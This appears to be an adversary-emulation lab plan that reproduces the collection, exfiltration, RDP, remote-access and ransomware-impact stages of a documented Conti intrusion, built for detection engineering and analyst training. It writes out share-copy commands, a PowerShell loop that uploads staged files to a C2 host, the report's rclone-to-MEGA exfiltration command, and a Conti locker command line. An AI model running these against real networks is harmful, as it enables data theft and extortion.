# Final Campaign Plan — S10–S15 (Phase 3) with S1–S9 correlation anchors

Status: **PLAN** (approved design; execution on operator approval). Supersedes the
phase-3 notes in ``../../docs/attack-chain-plan.md` by
concretizing the final stages against the validated lab state (RUN-20261002-04).

---

## 0. Standing conventions

- **Repo language: English** for ALL repository content (docs, code comments, commits).
- One run = one `run_id` (`RUN-YYYYMMDD-<seq>`), one continuous kill chain S1→S15;
  every stage links to the next through artifacts and correlation keys (below).
- Evidence policy: no secrets in repo/logs; ledgers per `evidence/runs/RUN-20261002-05/RUN-schema.json`;
  artifacts as `ART-XX-XX-<token8>.json` with sha256 in the index; server-side receipts
  (`ART-07-01`, `ART-09-01`) are independent confirmation sources.

## 1. Research basis (C0015 — DFIR Report, 2021-11-29 "CONTInuing the Bazar Ransomware Story")

Historical chain points that the final phases mirror (per `../../docs/attack-chain-plan.md`,
section 5, all marked `[OBSERVED-C0015]`):

| Phase | Historical behavior `[OBSERVED-C0015]` |
|---|---|
| Collection | ShareFinder re-run; data staged then exfiltrated from a **different server** than the backup server |
| Transfer | **Rclone → MEGA in two rounds** (day 1 and day 4) with `--bwlimit 10M --transfers 7` (T1567.002/T1567.001, T1030 chunked) |
| RDP | Day 2 — RDP to the backup server via the beacon; backup console; Task Manager GUI (T1021.001); also `svchost.exe -k UnistackSvcGroup -s CDPUserSvc` callback `checkauj[.]com` |
| AnyDesk | Day 5 — portable remote-access tool installed under `c:\users\<REDACTED>\Videos` (T1219.002); long-lived connection; Process Hacker from the tool root (T1003.001-adjacent study) |
| Impact | Conti batch against domain-joined systems (T1486); post-impact file listing (T1083); no DC interaction; post-impact clean-up/restore window |

Lab substitutions (unchanged from project hard lines): MEGA → **internal sink only**;
AnyDesk public relay → lab-local portable tool; Conti encryptor → **bounded surrogate**
(`payloads/impact/c0015_impact.ps1`, allowlist-root-capped, reversible); no self-propagation.

## 2. Correlation anchors — how S10–S15 tie into the completed S1–S9 chains

The perfected S1–S9 pipeline (macro self-write entry, remote operator, WMI→rundll32
space-form, Security ingest, rules R01–R18) provides the invariants the final stages
must keep:

| Anchor | Where it is created / used in the final phases |
|---|---|
| `run_id` (one per campaign) | Every P3 command, manifest, receipt, ledger, sink path |
| Session tokens | `phase3` (WS01) and `phase7-session2` (FS01) from S1–S9 — the final stages run **on FS01 session 2** and report through the same beacon |
| **ART-06-01** (143.dll sha256 `CBCD2A8B…`) | S8a artifacts on FS01 `C:\C0015\` — the collection staging targets the same host |
| **ART-07-01** receipts | S9 completion — phase-3 starts only after the receipt exists (gate) |
| Logon-id chain | `4624 TargetLogonId` ↔ `4672 SubjectLogonId` (S7/S8b) — RDP (S12) continues the same identity story (`it.admin` type-10 logon) |
| Entity chain | `process.entity_id`/`parent.entity_id` — every new process in S10–S15 inherits the FS01 beacon lineage |
| Rules R01–R18 | Keep ENABLED during phase 3 — they are the S1–S9 detection layer; phase-3 adds R19–R20 (section 5) |

Gate: **S10 begins only when ART-07-01-<token>.json exists for this run_id** and the
FS01 `phase7-session2` beacon is live (c2sim `/sessions`).

## 3. Stage-by-stage plan (machines, commands, telemetry, artifacts)

### S6 (completion) — Target manifest (orchestration) — WS01/F S01 session 2

- Historical: orchestrator decision on the target share. Lab: fill `stage/ws01/target-manifest.json`
  (host/ip/share/selection_reason, auth account) → `artifact-new ART-04-02`.
- Evidence: `ART-04-02` artifact; no telemetry required.

### S10 — Collection and staging (T1005, T1039, T1074.001) — FS01 session 2

- Commands (beacon `/cmd` on the FS01 session-2 token, elevated):
  ```
  dir \\FS01\Finance, \\FS01\IT
  powershell -NoProfile -Command "Get-ChildItem -Recurse \\FS01\Finance,\\FS01\IT | Select FullName,Length,LastWriteTime"
  copy \\FS01\Finance\*.txt C:\C0015\collect\
  ```
  (mirrors ShareFinder re-run; staged into a collection dir on FS01 `C:\C0015\collect\`).
- Telemetry:
  - Sysmon: E1 (beacon→cmd/powershell children), E11 (collect\ file creates), E3 (any callback).
  - Security: S5145 (share reads/writes — audit ON since 2026-10-02).
- Keys: `process.entity_id` beacon lineage; `file.path` `*C0015\collect*`; `user.name=it.admin`.
- Artifact: `ART-08-01` — `python scripts/lab_tools.py manifest-new <corpus_dir> RUN-… -o stage/ws01/art08_01.json`
  (per-file sha256/size — the transfer receipt must hash-match this).
- Gate: manifest exists and corpus files readable.

### S11a / S11b — Transfer to the internal sink (two rounds, T1567.002 surrogate / T1030 approx.) — FS01 → C2 host

- Sink (NEW, implement before execution): `scripts/p5_sink.py` — stdlib HTTP server on the C2
  host (192.168.50.1:9000): `POST /upload?run=<run_id>&round=1|2` with file bytes → stores
  `stage/sink/<run_id>/round<N>/<sha256>` + appends a server-side **ART-09-01-style receipt**
  (manifest hash == received hash == allowlist). Chunked upload (≤512 B rounds) optional flag
  to approximate T1030; default single POST per file.
- Client (FS01 beacon tasking):
  ```
  powershell -NoProfile -Command "Get-ChildItem C:\C0015\collect -File | ForEach-Object { Invoke-WebRequest -Method POST -Uri http://192.168.50.1:9000/upload?run=RUN-…&round=1 -InFile $_.FullName -UseBasicParsing }"
  ```
- Two rounds: round 1 after S10, round 2 after S12 (RDP between them — mirrors day1/day4).
- Telemetry: E3 (FS01→:9000 egress, destination.port=9000), E11 (sink-side only — the victim side is minimal).
- Evidence rule: **receipt hash == manifest hash == allowlist** (lab_tools `receipt-check`); two receipts under one run_id.
- Artifacts: `ART-09-01` (round 1) + `ART-09-01` (round 2) in the ledger (two entries).

### S12 — RDP interactive (T1021.001) — WS01 ↔ FS01, it.admin

- Historical: day-2 RDP to the backup server via the beacon console. Lab: `mstsc /v:FS01`
  as `C0015\it.admin` (automation-safe: `cmdkey /generic:TERMSRV/FS01 /user:… /pass` on
  the C2 host OR manual credential entry; never in evidence).
- Preflight: audit subcategories ON — `auditpol /set /subcategory:"Logon/Logoff" /success:enable /failure:enable`
  and Terminal Services sessions: `auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable`.
- Telemetry: **S4624 Type 10** (Network → `LogonType=10`, `user.name=it.admin`,
  `TargetLogonId`), **4778/4779** (TS session reconnects), Sysmon E1 `mstsc.exe` (WS01).
- Artifact: `ART-10-01` RDP bundle (logon id + session info).
- Detection: **R19** (proposal, section 5) — `S4624 LogonType=10` + 4778 join.
- Note: FS01 RDP must be enabled in preflight (SystemPropertiesRemote / registry) — add to P0.

### S13 — AnyDesk-like + LSASS telemetry study (T1219.002; T1003.001-adjacent, supplemental) — FS01

- AnyDesk-like: install a legitimate portable remote-access binary under `C:\Users\Public\Videos\`
  (mirrors `Videos\` placement); connect lab-local only (no public relay). If the tool is not
  pre-approved, use **AnyDesk surrogate = a listener-only portable SFTP/HTTP agent** — decision
  recorded in the run notes.
- LSASS study: reuse the safe E10 probe (minimal rights, no dump) or fixtures/replay
  (`scripts/fixtures/e10_lsass_probe.json`) — no credential material.
- Telemetry: E11 (portable tool in `*Videos*`), E1 (tool start), E3 (lab-local connection),
  E10 (LSASS minimal-access study — analyze, not alert).
- Artifacts: `ART-13-01` notes bundle.

### S14 — Bounded impact + post-impact validation + recovery (T1486 surrogate, T1083) — FS01

- Manifest: `impact-manifest.json` (corpus root `D:\C0015-Impact-Corpus`, backup
  `C:\C0015-Impact-Backup`, caps as in `payloads/impact/c0015_impact.ps1`).
- Sequence (on FS01, repo copy present):
  ```
  pwsh -File c0015_impact.ps1 -Manifest <m> -Action Prepare
  pwsh -File c0015_impact.ps1 -Manifest <m> -Action Run
  pwsh -File c0015_impact.ps1 -Manifest <m> -Action Verify   # T1083 listing + hash compare
  pwsh -File c0015_impact.ps1 -Manifest <m> -Action Rollback
  pwsh -File c0015_impact.ps1 -Manifest <m> -Action Verify   # post-restore
  ```
- Telemetry: E11 (rename/extension/note writes — high rate), E2 (file change time), S5145
  if SMB-driven; post-impact E11 listing — needs Sysmon E23/26 (config flag) — record as optional.
- Safety: allowlist-root-capped, no real encryption, no propagation; corpus separate from evidence.
- Artifacts: `ART-14-01` impact metrics + recovery report (`lab_tools.py` compute + commit).
- Detection: —

### S15 — E2E run + investigation exercise (engineering + training)

- One continuous run S1→S14 under one `run_id`; run ledger finalized with every stage row.
- Investigation exercise: ground truth = the ledger, HIDDEN until the end; analyst reconstructs
  from Elastic/Kibana + rule alerts + receipts; score with
  `python scripts/lab_tools.py score <ground_truth> <reconstruction> -o art15_01.json` → `ART-15-01`.

## 4. Detection additions for phase 3 (proposals — follow R01–R18 style, no lab hardcodes)

| Rule | Stage | Event basis | Logic class |
|---|---|---|---|
| R19 | S12 RDP | Security `4624 LogonType=10` (+ 4778) | single-event: `event.code=="4624" and winlog.event_data.LogonType=="10" and user.name != null and not user.name : ("*$","SYSTEM",…)` — BB ON low; correlate with 4778 manually |
| R20 | S13 remote-access tool | Sysmon E11 + E1 | `file.path : ("*\\Videos\\*", "*\\AppData\\*")` + portable-tool class / `process.name : ("anydesk*","mstsc*", …)` — validate against the chosen surrogate binary |
| R21 | S14 impact | Sysmon E11/E2 bulk, note create | pattern: file extension change `*.c0015` class + `README_C0015_LAB.txt` note — validate on the surrogate run before enabling |

After S15 validation, add the mapping rows to `detections/README.md` (kill-chain table) —
extend the existing S1–S9 mapping with S10–S15 rows.

## 5. Run procedure (execution order, tied to the verified runbook)

1. P0 additions: build/verify `scripts/p5_sink.py`; enable RDP on FS01 (+ `Logon/Logoff`,
   `Other Logon/Logoff Events` audit); extend Sysmon config for E23/26 (optional, S14).
2. Pre (orchestrator `-Action Pre -RunId RUN-<final>`) + phase7 config run_id + servers.
3. S1–S9 exactly as validated (macro self-write entry, manual victim open, operator phase,
   rules sweep) — gate on `ART-07-01`.
4. S6/S10 collection → `ART-08-01`; S11a transfer (round 1) → receipt;
   S12 RDP → R19 alert; S11b transfer (round 2) → receipt; S13 AnyDesk-like;
   S14 impact → verify/rollback → `ART-14-01`; S15 score → `ART-15-01`.
5. Verify: `scripts/verify/verify_run_evidence.py` extended with phase-3 sections
   (sink receipts, 4624 T10, 4778, impact manifests, scorecard) — window = full run.
6. Alerts: per-rule counts on the full window (expected new: R19/R20 + existing
   R01–R18) — update `detection-run-<run>.md` + README mapping.
7. Ledger `RUN-<final>.json` + receipts committed; cleanup (beacons, servers, Defender
   re-enable decision recorded).

## 6. Safety boundaries (unchanged project hard lines)

- Exfiltration stops at the internal sink — no MEGA/Telegram/public relay.
- No general-purpose encryptor, no self-propagation; impact surrogate allowlist-capped + reversible.
- AnyDesk-like/remote sessions lab-local; public relay never used as C2.
- Secrets never in command lines, files, or logs (operator-facing passwords at prompts or
  DPAPI clixml under `stage/`, gitignored).
## 7. DFIR report cross-check (full text verified 2026-10-02 — https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)

The plan above was cross-checked against the original report text (fetched 2026-10-02; the
lab scheme already mirrored the key chain). Exact report details now pinned into the plan:

| Report detail | Lab mapping | Notes |
|---|---|---|
| Discovery set: `tasklist /s`, `net group "domain admins" /dom`, `net localgroup "administrator"`, `nltest /domain_trusts /all_trusts`, `net view /all /domain`, `net view /all time`, `ping` | **identical** to `scripts/runbooks/c0015-phase2.json` (S4) | runbook was derived from this exact list — correlation preserved |
| ShareFinder → `c:\ProgramData\found_shares.txt` | S5 writes `found_shares.txt` to `C:\ProgramData` (already) | name/path parity |
| WMI invoking Rundll32 to load **143.dll** on the target | S8b `wmiprvse→rundll32→c0015_143_surrogate.dll` (space-form fix) | parity via ART-06-01 hash |
| **Rclone** exfil: `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`; two rounds (19-22 UTC day1/day4) | **REAL rclone** (open-source, official release) with the SAME parameters, remote = **LOCAL** (`sink` configured as rclone `local` or a local WebDAV endpoint on the C2 host feeding `stage/sink/<run>/round<N>`) | keeps the exact tool + CLI (E1/E11 + detection per NCC rclone guidance) with zero public cloud; **no MEGA credentials/API needed** |
| AnyDesk portable under `c:\users\<REDACTED>\Videos` (day 5) | AnyDesk-like = **RustDesk portable** (open-source) in `C:\Users\Public\Videos\` + **self-hosted relay on the C2 host** (hbbs/hbbr) | T1219.002 telemetry without public relay; real AnyDesk rejected (its relay connects to public infrastructure — violates the no-public-relay boundary) |
| ProcessHacker dropped at `C:\` root; used for LSASS | **ProcessHacker2 portable** at `C:\` root during S13; open LSASS handle **minimal access only (E10, no dump / no credential read)** | E10 source picture stays; run notes record "no dump" |
| `locker.bat` → `_locker.exe -m -net -size 10 -nomutex -p \\HOST\C$` + `readme.txt` note + post-impact file listing | S14 surrogate (`c0015_impact.ps1`) mirrors: bulk file transform + note + `Verify` (T1083 listing) + Rollback | bounded, reversible, allowlist corpus |
| Operators never interacted with DCs | Lab keeps DC01 telemetry-only (unchanged) | boundary |
| RDP day 2 via the beacon + backup console + taskmanager GUI (`/4`) | S12 RDP `it.admin` + audit; note the taskmgr `/4` observation as optional S13 nuance (open `taskmgr.exe /4` once for parent/child telemetry) | optional |

Sigma rules from the report worth mirroring in later rule work: `win_susp_wmic_proc_create_rundll32`,
`sysmon_rundll32_net_connections`, `rclone_execution`, `sysmon_abusing_debug_privilege`,
`win_mshta_spawn_shell`, `win_susp_net_execution` — our R01-R18 already cover several; document
mapping in a follow-up.

Decisions (operator-approved): rclone→local sink (rev 1), RustDesk+local relay (AnyDesk-like),
ProcessHacker E10-no-dump. No external credentials are required for the final campaign.






